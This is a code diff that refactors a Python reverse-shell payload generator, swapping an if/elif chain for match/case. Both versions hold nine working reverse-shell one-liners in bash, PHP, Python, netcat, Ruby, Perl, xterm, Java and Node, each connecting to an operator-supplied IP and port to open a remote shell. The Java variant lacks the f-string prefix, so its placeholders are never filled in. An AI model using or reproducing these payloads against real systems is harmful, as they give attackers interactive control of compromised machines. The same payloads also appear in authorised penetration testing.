@@ -43,26 +43,27 @@ def get_ip_and_port():
             print("Invalid IP or port. Please enter valid values.")
 
 def encode_shell(shell_type, ip, port):
-    if shell_type == '1':
-        return f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
-    elif shell_type == '2':
-        return f'php -r \'$sock=fsockopen("{ip}", {port});exec("/bin/sh -i <&3 >&3 2>&3");\''
-    elif shell_type == '3':
-        return f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
-    elif shell_type == '4':
-        return f'nc -e /bin/sh {ip} {port}'
-    elif shell_type == '5':
-        return f'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
-    elif shell_type == '6':
-        return f'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''
-    elif shell_type == '7':
-        return f'xterm -display {ip}:{port}'
-    elif shell_type == '8':
-        return 'r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]);p.waitFor()'
-    elif shell_type == '9':
-        return f'require("child_process").exec("nc -e bash {ip} {port}")'
-    else:
-        return None
+    match shell_type:
+        case '1':
+            return f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
+        case '2':
+            return f'php -r \'$sock=fsockopen("{ip}", {port});exec("/bin/sh -i <&3 >&3 2>&3");\''
+        case '3':
+            return f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
+        case '4':
+            return f'nc -e /bin/sh {ip} {port}'
+        case '5':
+            return f'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
+        case '6':
+            return f'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''
+        case '7':
+            return f'xterm -display {ip}:{port}'
+        case '8':
+            return 'r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]);p.waitFor()'
+        case '9':
+            return f'require("child_process").exec("nc -e bash {ip} {port}")'
+        case _:
+            return None
     
 def get_user_choice():
     while True:
